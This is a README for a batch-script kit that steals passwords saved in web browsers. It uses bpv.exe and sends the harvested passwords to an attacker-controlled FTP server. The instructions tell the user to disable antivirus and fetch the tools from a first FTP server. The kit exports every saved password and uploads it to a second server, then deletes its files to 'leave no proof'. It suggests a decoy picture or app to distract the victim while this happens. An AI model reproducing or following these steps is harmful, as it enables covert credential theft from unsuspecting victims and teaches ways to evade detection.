# bpv-script

## simple script using bpv.exe to send founded on your web-browsers passwords to your ftp server.

Instruction : 

Note1: Remember that opening ANY batch file might alert your antivirus, in which case the batch file will be deleted. 
If you don't want that to happen, make sure the antivirus is turned off before opening any batch file.

Note2: If you want to rename filenames (ex. 'bpv' to 'whatever'), you need to change the scripts (replace all 'bpv's with 'whatever's).

1) Find 2 free FTP servers online and create accounts on both of them (for example, I used Square7.ch and 0fees.us). 
For some reason, the batch files don't work if you use the same FTP server, that's why you need 2 of them.

2) Edit 'start' and 'start2' files by replacing all the ** parts with your own FTP information. 
Once you're done with that, save both files with the .bat extension.

3) Upload the following files from this folder to the first FTP server: bpv.exe, close.vbs and start.bat

4) From now on, the only file you will need is 'start2.bat'. Once you open it, it will do the following:
-download the rest of the files from your ftp1 server
-export all passwords onto a text file and upload it to ftp2 server
-delete all the files and leave no proof of you stealing passwords

This process should last ONE MINUTE on average.

Optional: You can also edit the start2 file so that it starts another application/picture/website 
(or anything else that will be the distraction while the 'stealing' process happens in the background).
